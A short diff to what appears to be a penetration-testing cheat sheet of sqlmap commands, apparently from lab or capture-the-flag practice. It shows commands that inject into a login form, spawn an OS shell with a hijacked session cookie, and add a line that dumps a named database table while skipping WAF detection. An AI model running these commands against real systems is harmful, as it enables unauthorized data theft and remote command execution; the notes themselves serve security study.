@@ -8,3 +8,6 @@ sqlmap -u "http://35.227.24.107/a0218d304a/login" --method=POST  --dbms=mysql --
 
 # use of cookie session and spawn a shell using sqlmap 
 sqlmap -u "http://10.10.10.46/dashboard.php" --data="search=aaaa&form=submit" -p "search" --cookie="PHPSESSID=0648ghe9hu8gvjp0fa58pev9j0" --os-shell --flush
+
+# status codes to accept 200 and ignore 500, skip heuristic detection of WAF/IPS protection, Max number of concurrent HTTP(s) requests =2 and -o for Turning on all optimization switches
+sqlmap.py -u "http://website.local/fetch?id=1" --method=GET --dump -D db_name -T table_name -p id --code=200 --ignore-code=500 --skip-waf --threads=2 -o
